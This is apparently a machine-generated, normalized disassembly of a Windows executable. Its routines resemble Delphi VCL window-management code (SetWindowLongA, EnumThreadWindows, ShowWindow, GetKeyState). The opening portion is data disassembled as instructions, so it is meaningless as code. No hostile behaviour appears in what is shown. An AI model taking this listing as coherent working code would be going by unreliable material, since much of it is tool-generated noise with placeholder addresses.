mov ebx 0xe00044
add bh bh
loopne r-xdata
jae r-xdata
inc ebp
outsb
je r-xdata
jne r-xdata
mov edx 0x1280044
pop esp
add [ edi + ecx * 2 ] cl
insb
mov ecx 0xc00044
add bh bh
rol [ eax ] 0x0
[ eax + 0x43f6 ]
jb r-xdata
dec edi
int3
add bh bh
test al 0xf6
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0051 ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0061 ] al
outsb
dec ebp
push ebp
sbb [ esi ] 0x9
dec edi
jb r-xdata
jae r-xdata
inc esp
outsd
ja r-xdata
dec ebp
outsd
jne r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
push 0x906c6565
rol [ eax + eax + 0x48 ] 0x1
add bh bh
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
dec esp
popad
jbe r-xdata
sbb [ edx ] 0xb
dec edi
outsb
dec ebp
outsd
jae r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
jbe r-xdata
outsb
inc ecx
push edi
push 0x556c6565
jo r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c005f ] al
rol [ eax + eax + 0x40 ] 0x1
add bh bh
outsd
jne r-xdata
jo r-xdata
push ebp
add bh bh
sub [ ecx ] al
add bh bh
test al 0xf6
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0059 ] al
outsb
dec ebp
outsd
jne r-xdata
sub [ ecx ] al
outsb
outsb
inc ecx
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c005c ] al
add [ eax + 0x4f100060 ] al
outsb
dec ebp
outsd
jbe r-xdata
mov [ esi + 0x41 ] gs
jae r-xdata
push edi
push 0x446c6565
outsd
ja r-xdata
outsb
dec ebp
outsd
jne r-xdata
dec edi
in al 0xb9
inc esp
add al cl
add [ eax ] al
dec eax
add [ eax ] al
[ eax + 0x43f6 ]
add [ eax ] bh
add [ eax ] eax
outsb
inc ecx
add [ ebx + 0x2180044 ] bh
add bh bh
sbb [ edx ] al
add bh bh
test al 0xf6
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070058 ] al
mov ebx 0x2080044
add bh bh
or [ edx ] al
push esp
add [ esi ] al
dec edi
outsb
dec eax
imul esp [ ebp - 0x2c ] 0xf000439e
add al [ eax ]
push eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060055 ] al
outsb
dec eax
insb
jo r-xdata
inc eax
outsb
inc ecx
add [ eax ] al
add eax [ eax ]
inc [ eax ]
add eax [ eax ]
[ eax + 0x43f6 ]
add [ edi ] al
dec edi
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
call 0xffffffffe942b129
add [ eax ] al
[ eax + 0x43f6 ]
push edi
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
outsb
dec ebp
outsd
jne r-xdata
insb
mov ecx 0xd00044
add bh bh
rol [ eax ] 0x1
add bh bh
test al 0xf6
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09005e ] al
je r-xdata
jpe r-xdata
cwde
sahf
inc ebx
add [ eax ] cl
add eax [ eax ]
dec [ eax ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0064 ] al
outsb
push ebx
push 0x4374726f
jne r-xdata
nop
rol [ eax + eax + 0x50 ] 0x1
add bh bh
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
and al 0xb3
inc ebx
add [ ebx + esi * 4 + 0x43 ] bl
add [ eax + 0x3 ] ah
add [ eax ] al
insb
lahf
inc ebx
add [ eax + 0x7 ] dl
inc edx
add [ eax - 0x5bffbc2d ] ah
aad 0x43
outsd
arpl [ ebx - 0x3c ] bp
mov ebp 0x2200044
add bh bh
and [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ bx + si ] cl
dec edi
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
shl [ eax ] 0xb2
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4d ] dh
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] dl
add eax [ eax ]
call [ eax ]
add eax [ eax ]
[ eax + 0x43f6 ]
mov [ esi + 0x41 ] gs
add ah al
xchg ecx eax
inc ebp
add al bl
fadd [ ebx ]
inc eax
sahf
inc ecx
add [ edi + esi - 0x2797ffbc ] ah
inc ebx
add [ ecx + ebx * 8 + 0x67c0043 ] ah
inc ebp
add [ eax + 0x7 ] ch
inc edx
add [ esi ] al
inc ebx
add [ esp + eax + 0x42 ] al
add [ ebx + esi + 0x362c0044 ] ch
inc esp
add al ch
mov eax [ ebp ]
hlt
inc esp
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 4 ] ah
add [ eax + ecx * 2 + 0xa6c0040 ] ch
inc esp
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ esi + edx * 8 ] cl
inc ebx
inc ebx
jb r-xdata
sub_43b50c
inc [ eax ]
add [ eax ] al
add [ 0x6d726f46 ] al
jae r-xdata
outsb
mov eax eax
mov al 0xb4
inc ebx
add [ edi ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
pushad
mov ah 0x43
add [ edx + eax * 4 + 0x41 ] al
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
mov ch 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + r-xdata ] dl
push cs
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
add [ eax ] al
add [ ebp + esi * 4 - 0x4a17ffbd ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh dl
mov ch 0x43
add [ eax + 0x1 ] ch
add [ eax ] al
dec eax
add [ ecx ] sub_420750
movsb [ edi ] [ esi ]
dec eax
inc eax
add [ eax + eax + 0x48ac0042 ] cl
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ edi + ecx * 2 + 0x44 ] bh
add [ edi + ebx * 4 ] ah
inc ecx
add [ ebx + eax + 0x42 ] dl
add [ eax - 0x62 ] al
inc ecx
add [ esp + eax ] ch
inc edx
add ah dh
add al [ edx ]
cmp al 0x4
inc edx
add [ eax + 0x7680042 ] dh
inc edx
add [ esp + eax + 0x42 ] cl
add [ esp + eax + 0x42 ] al
add [ eax + 0x7 ] dh
inc edx
add [ eax + 0x4d ] ah
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
cmp al 0x0
add [ eax ] al
dec esp
iretd
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
nop
sub_43b60c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc ebx
add al dl
add [ eax ] al
add [ esp + edx * 2 ] cl
inc ecx
jo r-xdata
inc ebx
add [ esi + eax * 2 ] al
inc eax
add [ esi + ebx * 4 ] dl
inc ecx
add [ edi + ebx * 4 ] ah
inc ecx
add [ edi + ebx * 4 ] ch
inc ecx
add [ eax + eax * 4 - 0x7eebffbc ] bh
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
nop
call 0x743f99e
or al 0x54
inc ecx
jo r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
inc esi
jb r-xdata
inc esp
add [ ebx ] cl
push esp
inc edi
insb
popad
jae r-xdata
inc esp
add [ ecx + eax * 4 ] dl
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
mov ch 0x43
add [ edx + eax * 4 + 0x41 ] al
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
je r-xdata
adc [ eax ] al
adc al 0x0
add al 0x4c
insd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 4 + 0x43 ] ah
add [ esi + esi * 4 + 0x43 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 4 + 0x43 ] dh
jne r-xdata
outsd
insd
add [ eax ] dl
inc eax
add [ eax ] ch
add [ eax ] al
push eax
add [ eax + eax + 0x1 ] 0x0
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x68530c00
je r-xdata
push 0x4f746565
adc [ eax ] al
sbb [ eax ] al
add bh bh
nop
add [ eax + eax + 0x1 ] 0x3000000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
push es
inc edx
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ebx ] al
adc [ eax ] al
adc [ eax ] al
add bh bh
nop
add [ eax + eax + 0x1 ] 0x1000000
add [ eax + eax ] ch
add [ eax ] al
and [ ebp + 0x41 ] dh
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
mov dh 0x43
inc ebx
add [ edi ] al
or edx [ edi + eax * 2 + 0x6c ]
popad
jae r-xdata
pop esi
pop ebx
retn
or eax 0x200
jmp r-xdata
les eax [ edx ]
inc di
insb
popad
jae r-xdata
push esi
call SetWindowPos
mov eax eax
push esp
outsd
jo r-xdata
inc esi
jb r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
add bh bh
nop
add [ eax + eax + 0x1 ] 0x2000000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ 0x68676952 ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add edx [ edi + ebp * 2 + 0x70 ]
cmp al 0x10
inc eax
add [ eax + eax ] dl
insd
push esp
mov dh 0x43
add [ ebp + esi * 2 + 0x60041 ] dl
add eax 0x6d726f46
jae r-xdata
add [ eax ] al
jmp [ eax - 0x7f ]
je r-xdata
add [ eax ] al
adc [ eax ] al
or [ eax ] al
add bh bh
pushad
add [ eax + eax + 0x1 ] 0x0
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
cmp al 0x10
inc eax
add [ eax + eax ] cl
add bh bh
nop
add [ eax + eax + 0x1 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ esp + ecx * 2 ] al
sub_43b78c
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_43b7d8
push ebx
push esi
push edi
push ecx
mov [ esp + 0x1 ] cl
mov [ esp ] dl
mov esi eax
push 0xffffffec
push esi
call GetWindowLongA
mov edi eax
mov eax [ rw-data ]
cmp esi [ eax + 0x30 ]
jne r-xdata
push esi
call IsIconic
cmp eax 0x1
sbb ebx ebx
inc ebx
push esi
call IsWindowVisible
test eax eax
jne r-xdata
or edi 0x8000000
mov al 0x1
mov eax [ rw-data ]
cmp esi [ eax + 0x30 ]
jne r-xdata
cmp [ esp ] 0x0
je r-xdata
push 0x0
push esi
call ShowWindow
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x5b ] 0x0
jne r-xdata
and edi 0xfffbffff
push edi
push 0xffffffec
push esi
call SetWindowLongA
or edi 0x40000
push edi
push 0xffffffec
push esi
call SetWindowLongA
jmp r-xdata
mov [ esp + 0x2 ] al
movzx eax [ esp + 0x2 ]
or al bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
movzx eax [ esp + 0x1 ]
and al [ esp + 0x2 ]
jne r-xdata
push 0x5
push esi
call ShowWindow
push 0x6
push esi
call ShowWindow
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_43b898
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_446d9c
mov eax [ rw-data ]
call sub_420278
mov eax [ rw-data ]
call sub_42021c
retn
xor edx edx
mov eax [ rw-data ]
call sub_4455ec
sub_43b8d0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_402f00
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_43b920
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_43b9d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ rw-data ] 0x1
xor eax eax
push ebp
push sub_43b993
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_43b8d0
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b9d8
mov [ rw-data ] 0x0
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_43b9e4
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_402f1c
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_43ba1c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_43ba80
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_43ba1c
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_43badc
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_43bafc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
or edi 0xffffffff
lea eax [ ebp - 0x4 ]
push eax
push ebx
call __imp_GetWindowThreadProcessId
cmp ebx [ esi ]
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call GetCurrentProcessId
cmp eax [ ebp - 0x4 ]
jne r-xdata
xor edi edi
mov [ esi + 0x4 ] 0x1
sub_43bb34
push ebx
add esp 0xfffffff8
mov ebx eax
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
test bl bl
je r-xdata
mov eax esp
push eax
push sub_43badc
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax esp
push eax
push sub_43bafc
call EnumWindows
jmp r-xdata
movzx eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_43bb78
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_443e04
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_444278
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_4099e8
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_443df0
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_444264
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_4099e8
test eax eax
je r-xdata
sub_43bbf8
push ebx
push esi
mov esi eax
movzx ebx [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_43bc50
push ebx
push esi
mov esi eax
movzx ebx [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_43bc90
push ebx
push esi
mov esi eax
movzx ebx [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_43bcdc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43bd3a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_439384
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_405718
mov eax [ ebp - 0x8 ]
pop edx
call sub_4099e8
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bd41
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_43bd4c
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
test bl bl
jne r-xdata
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
jne r-xdata
mov esi [ esi + 0x30 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
pop esi
pop ebx
retn
sub_43bda0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi eax
xor eax eax
push ebp
push sub_43be11
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_43bd90
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43be18
lea eax [ ebp - 0xc ]
call sub_405530
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40db38
call sub_404ec4
sub_43be20
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_404620
mov [ edi + 0x4 ] esi
movzx eax [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_43beb4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_419e40
mov edi esi
movzx edx [ edi + 0x1c ]
mov eax ebx
call sub_43c790
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_43c76c
mov edx [ edi + 0xc ]
mov eax ebx
call sub_43c61c
movzx eax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43bf04
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_43c0c4
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_450f98
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_43c61c
xor edx edx
mov eax ebx
call sub_43c61c
jmp r-xdata
sub_43bf3c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
movzx eax [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov edx [ edx + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
cmp edx eax
jl r-xdata
movzx eax [ r-xdata ]
and al [ ebx + 0x61 ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax edx
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_43bfac
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
movzx eax [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov edx [ edx + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
cmp edx eax
jl r-xdata
movzx eax [ r-xdata ]
and al [ ebx + 0x61 ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax edx
sub_43c018
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x258 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_43c754
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4546e8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_43c754
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4546ac
call sub_43bfac
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4546ac
call sub_43bf3c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_43c0c4
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_4585f8
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_43c0fc
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4585f8
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_43c130
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_43c0fc
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_43c0fc
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_43c1ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4585f8
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_43c130
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_450210
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_43c130
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_450254
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_43c244
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
